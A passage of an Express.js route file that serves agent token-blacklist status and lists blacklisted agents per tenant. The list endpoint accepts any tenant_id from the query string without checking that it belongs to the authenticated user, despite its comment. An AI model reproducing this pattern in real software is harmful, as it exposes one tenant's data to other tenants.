    // Get blacklist info
    const blacklistInfo = await tokenBlacklistService.getBlacklistInfo(agentId, agent.tenant_id);
    
    if (!blacklistInfo) {
      return res.json({
        blacklisted: false,
        agentId
      });
    }
    
    res.json({
      blacklisted: true,
      agentId,
      ...blacklistInfo
    });
  } catch (err) {
    console.error('[BLACKLIST] Error getting blacklist status:', err);
    res.status(500).json({ error: 'Failed to get blacklist status' });
  }
});

// Get all blacklisted agents for current user's tenants
router.get('/blacklist/list', authenticateJWT, async (req, res) => {
  try {
    const tenantId = req.query.tenant_id;
    
    if (!tenantId) {
      return res.status(400).json({ error: 'tenant_id is required' });
    }
    
    // Get all blacklisted agents for tenant
    const blacklistedAgents = await tokenBlacklistService.getBlacklistedAgents(tenantId);
    
    res.json({
      tenantId: tenantId,
      count: blacklistedAgents.length,
      agents: blacklistedAgents
    });
  } catch (err) {
    console.error('[BLACKLIST] Error getting blacklisted agents:', err);
    res.status(500).json({ error: 'Failed to get blacklisted agents' });
  }
});

module.exports = router;
